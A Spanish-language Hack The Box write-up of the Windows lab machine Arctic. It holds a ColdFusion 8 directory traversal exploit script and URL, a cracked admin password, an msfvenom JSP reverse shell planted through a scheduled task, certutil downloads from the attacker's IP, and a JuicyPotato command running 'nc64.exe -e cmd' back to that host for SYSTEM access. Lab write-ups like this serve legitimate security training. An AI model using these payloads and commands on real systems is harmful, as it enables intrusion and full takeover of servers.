---
layout      : post
title       : "Maquina Arctic - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Arctic/arctic.png
category    : [ hackthebox ]
tags        : [ Adobe Coldfusion, Directory traversal, Cracking hash, Schedule Tasks, Create malicius JSP , Abusing SeimpersonatePrivilege ]
---

El dia de hoy vamos a estar resolviendo la maquina `Arctic` de `hackthebox` que es una maquina `Windows` de dificultad `Facil`. Para explotar esta maquina abusaremos una vulnerabilidad de `Adobe Coldfusion 8` que nos permitira realizar un `directory path traversal` y una vez conectados al `Coldfusion` nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo `jsp` malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario `administrator` nos aprovecharemos del privilegio `Seimpersonateprivilege`.

Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Arctic
❯ ls
 Arctic
```

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
```

## Enumeración [#](#enumeración) {#enumeración}
 

Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.11
PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=168 ms

--- 10.10.10.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 167.800/167.800/167.800/0.000 ms
```
Vemos que la maquina nos responde con un `ttl` de `127` correspondiente a una maquina `windows`, ahora procederemos a el scaneo de puertos con la ayuda de `nmap`:


### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `allPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:49 GMT
Initiating SYN Stealth Scan at 15:49
Scanning 10.10.10.11 [65535 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 49154/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 15:49, 26.54s elapsed (65535 total ports)
Nmap scan report for 10.10.10.11
Host is up, received user-set (0.13s latency).
Scanned at 2023-04-11 15:49:10 GMT for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 19 (836B)
```
Podemos ver puertos interesantes que se encuentran abiertos como `135 rpc` , `8500 fmtp` , `445 smb` y `49154 unknown - desconocido`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p 135,8500,49154 10.10.10.11 -oN targets
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:51 GMT
Nmap scan report for 10.10.10.11
Host is up (0.29s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.62 seconds
```
Visulizamos la versión de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 135     | MSRPC      | Microsoft Windows RPC |
| 8500   | FMTP?     |  |
| 49154   | MSRPC     | Microsoft Windows RPC |



## Explotación [#](#explotación) {#explotación}

Primero ya que `nmap` no detecto el servicio del puerto `8500` en vista que nos pregunta si es `fmtp?`, puede tratarse de un servicio web, pero como tarda en responder al no encontrar nada no tiene claro el servicio.


Vamos al navegador y veamos si el servicio es `http`, nos tarda un poco pero efectivamente si es un servicio web.


![](/assets/images/HTB/htb-writeup-Arctic/arc1.PNG)


Dentro del dicrectorio `CFIDE` vemos nuevos directorios interesantes.

![](/assets/images/HTB/htb-writeup-Arctic/arc2.PNG)


Si ahora vamos al direcotrio `administrator`, vemos un panel administrativo de `Adobe Coldfusion 8`


![](/assets/images/HTB/htb-writeup-Arctic/arc3.PNG)


Seguidamente veamos con `searchsploit` si existen vulnerabilidades asociadas a `Adobe coldfusion`.

```bash
❯ searchsploit adobe coldfusion
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                  | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                               | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                  | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                   | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                          | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                        | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                    | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                   | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                  | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                            | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                               | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                                      | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                                            | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                         | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                      | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                               | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                | cfm/webapps/33168.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Vemos que hay varias vulnerabilidades asociadas como una concreta `Adobe ColdFusion 8 - Remote Command Execution (RCE)`, que concretamente nos va a automatizar todo un proceso para ganar acceso a la maquina. Pero en este caso ya que vamos a realizar la explotación manualmente usaremos la asociada con `Adobe ColdFusion - Directory Traversal`.


Pasemos a inspeccionar ese exploit y veamos en que consiste.


```bash
❯ searchsploit -x multiple/remote/14641.py
```

Veamos de que trata el exploit

```python
# Working GET request courtesy of carnal0wnage:
# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
#
# LLsecurity added another admin page filename: "/CFIDE/administrator/enter.cfm"


#!/usr/bin/python

# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
# detailed information about the exploitation of this vulnerability:
# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

# leo 13.08.2010

import sys
import socket
import re

# in case some directories are blocked
filenames = ("/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/administrator/archives/index.cfm", "/cfide/install.cfm", "/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/enter.cfm")

post = """POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

locale=%%00%s%%00a"""

def main():
    if len(sys.argv) != 4:
        print "usage: %s <host> <port> <file_path>" % sys.argv[0]
        print "example: %s localhost 80 ../../../../../../../lib/password.properties" % sys.argv[0]
        print "if successful, the file will be printed"
        return

    host = sys.argv[1]
    port = sys.argv[2]
    path = sys.argv[3]

    for f in filenames:
        print "------------------------------"
        print "trying", f

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(post % (f, host, len(path) + 14, path))

        buf = ""
        while 1:
            buf_s = s.recv(1024)
            if len(buf_s) == 0:
                break
            buf += buf_s

        m = re.search('<title>(.*)</title>', buf, re.S)
        if m != None:
            title = m.groups(0)[0]
            print "title from server in %s:" % f
            print "------------------------------"
            print m.groups(0)[0]
            print "------------------------------"

if __name__ == '__main__':
    main()
```

Podemos ver que esta realizando una petición a `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en` para extraer un archivo local.


Hagamos eso entonces y en el navegador agreguemos esa petición.


![](/assets/images/HTB/htb-writeup-Arctic/arc4.PNG)


Efectivamente nos realiza un leak de una contraseña encryptada, asi que vallamos a nuestra web de confianza y tratemos de crackearla.

* [https://crackstation.net/](https://crackstation.net/)

Logramos obtener la contraseña en texto plano

![](/assets/images/HTB/htb-writeup-Arctic/arc5.PNG)

Ahora que ya contamos de credenciales validas `admin:happyday`, vamos a logearnos en el panel.

![](/assets/images/HTB/htb-writeup-Arctic/arc6.PNG)

> Una vez ganes acceso a un `coldfusion` y estes como un usuario administrador al igual que un wordpress o un joomla, se pueden hacer ciertas cosas, para ganar acceso.

Podemos ir a las opciones de `schedule task` para crear una nueva tarea y a `mappings` para ver las rutas expuestas.

En `mappings` podemos ver dos rutas expuestas. Siendo una de ellas `C:\ColdFusion8\wwwroot\CFIDE`, que corresponde a la ruta que podiamos listar al conectarnos a la pagina. Eso quiere decir que si logramos crear un archivo y meterlo en esa ruta, esta claro que deberia cargarse el archivo en esta parte.

![](/assets/images/HTB/htb-writeup-Arctic/arc7.PNG)

Si ahora nos vamos a `schedule task`, podemos crear una tarea programada le damo un nombre. Y la idea es que en `URL` podemos emplear un archivo de una fuente que le indiquemos y en `File` podemos guardar ese contenido en una ruta dada.

![](/assets/images/HTB/htb-writeup-Arctic/arc8.PNG)

Ahora que tipo de archivos podemos emplear para realizar esto:

Pues si investigamos un poco acerca de `coldfusion` vemos que trabajan con archivos `asp`, `jsp` o `php`

![](/assets/images/HTB/htb-writeup-Arctic/arc9.PNG)

Asi que vamos a intentar crear un archivo `JSP` malicioso, para ello usaremos `msfvenom`

```bash
❯ msfvenom -l payloads | grep jsp
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
```

Vemos que tenemos un `payload` para otorgarnos una `shell`, asi que usaremos este payload `java/jsp_shell_reverse_tcp` y especificamos nuestra `ip` de atacante y el puerto en el cual estaremos en escucha que sera el `443`.

```bash
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.8 LPORT=443 -o reverse.jsp
Payload size: 1495 bytes
Saved as: reverse.jsp
❯ ls
 reverse.jsp
```
 Una vez tengamos listo el archivo malicioso, vamos a crear la tarea programada.

Espeficamos el nombre que queramos de la tarea `pwnarctic`, en `url` le indicamos que se conecte a nuestro equipo con el archivo `reverse.jsp` que estaremos alojando y lo guardaremos en la ruta expuesta en la que tenemos acceso de ver los recursos `C:\ColdFusion8\wwwroot\CFIDE\reverse.jsp` 

![](/assets/images/HTB/htb-writeup-Arctic/arc10.PNG)

Realizamos el `submit`


Lo siguiente sera compartirnos el archivo `reverse.jsp` en nuestro equipo, lo haremos con `python`

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Una vez la tarea haya sido creada, para correrla debemos darle al primer boton en verde en la parte de `actions`

![](/assets/images/HTB/htb-writeup-Arctic/arc11.PNG)

y vemos que recibo la petición en mi maquina

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [11/Apr/2023 17:15:00] "GET /reverse.jsp HTTP/1.1" 200 -
```

Recargamos la ruta en la que teniamos acceso a listar los recursos y genial vemos el `reverse.jsp`

![](/assets/images/HTB/htb-writeup-Arctic/arc12.PNG)


Quiere decir que si ahora pinchamos en el archivo `reverse.jsp` al interpretarme el servidor el archivo `jsp`, deberiamos ganar acceso al sistema.


Le damos y con `ncat` nos ponemos en escucha en el puerto `443`, tambien haciendo uso de `rlwrap` para obtener una consola mas interactiva.

```bash
❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

Esperamos unos segundos y ganamos acceso al sistema como el usuario `tolis`

```cmd
❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49672.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
arctic\tolis
```

Si ahora nos vamos al directorio personal del usuario `tolis`, podemos leer la primera flag `user.txt`

```cmd
cd C:\Users\tolis\Desktop
cd C:\Users\tolis\Desktop

type user.txt
type user.txt
b2d38d2f34b46b4189d147c805813fa4

C:\Users\tolis\Desktop>
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}


Veamos que privilegios tenemos como el usuario `tolis`, para ello usaremos el comando `whoami /priv`

```cmd
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Tenemos habilitado el `seImpersonatePrivilege`, podemos explotarlo de muchas formas, pero en esta ocasión lo haremos de una comoda:

Primero vamos a descargarnos el `JuicyPotato` del repositorio de `github`

* [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)


Nos vamos a los releases y concretamente nos descargamos el `juicyPotato.exe`


Ahora nos vamos a descargar el ejecutable de `ntcat` para `windowns` del siguiente enlace, concretamente la versión `1.12`, debemos descomprimirlo y usar el `nc.64.exe`

* [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)



Una vez tengamos ambos archivos, vamos a proceder a subirlos a la maquina victima

```bash
❯ ls
 JuicyPotato.exe   nc64.exe   reverse.jsp
```

Para subirlos nos compartiremos un servicio con `python3` y en la maquina victima haremos uso de `certutil.exe`, para descargarnos los archivos, no debemos olvidar que debemos irnos a una ruta en la cual tengamos permisos como `C:\Windows\Temp`

```cmd
cd C:\Windows\Temp
cd C:\Windows\Temp

mkdir Privesc
mkdir Privesc

cd Privesc
cd Privesc

C:\Windows\Temp\Privesc>
```

Ejecutamos `certutil.exe`

```cmd
certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.

certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\Privesc>
```

y recibimos la petición en nuestra maquina

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [11/Apr/2023 17:59:47] "GET /nc64.exe HTTP/1.1" 200 -
10.10.10.11 - - [11/Apr/2023 17:59:50] "GET /nc64.exe HTTP/1.1" 200 -
10.10.10.11 - - [11/Apr/2023 18:00:02] "GET /JuicyPotato.exe HTTP/1.1" 200 -
10.10.10.11 - - [11/Apr/2023 18:00:04] "GET /JuicyPotato.exe HTTP/1.1" 200 -
```

Verificamos que los archivos se subieron correctamente.

```cmd
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Windows\Temp\Privesc

13/04/2023  04:57     <DIR>          .
13/04/2023  04:57     <DIR>          ..
13/04/2023  04:57            347.648 JuicyPotato.exe
13/04/2023  04:57             45.272 nc64.exe
               2 File(s)        392.920 bytes
               2 Dir(s)   1.432.981.504 bytes free

C:\Windows\Temp\Privesc>
```

Como ya tenemos ambos archivos, la idea es ahora que con el `JuicyPotato.exe` podemos inyectar comandos de manera privilegiada.


```cmd
.\JuicyPotato.exe
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user

C:\Windows\Temp\Privesc>
```

Procedemos a ejecutarlo con los parametros necesarios:

* Con `-t` que es para crear un proceso vamos a usar `*` para usar las dos opciones
* Con `-l` un puerto (puede ser el que quieras)
* Con `-p` vamos a ejecutar un programa, que en nuestro caso sera la `cmd.exe` para atraves de ella ejecutar un comando privilegiado
* Con `-a` le pasaremos el argumentos, donde le pasaremos la ruta donde recide el `nc64.exe` para enviarnos una consola interactiva


Nos ponemos en escucha en nuestro equipo y proseguimos a ejecutarlo, si vemos que no nos hace nada, hay que ejecutarlo varias veces.

```cmd
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443"
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Windows\Temp\PRIVESC>
```

Y recibimos la conexión

```bash
❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49816.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system
```

Lo unico que nos queda por hacer es dirigirnos al directorio personal del usuario `administrator` y visualizamos la segunda flag `root.txt` :)

```cmd
cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

type root.txt
type root.txt
4804d15552ecad867e5f3b60985e1d34

C:\Users\Administrator\Desktop>
```
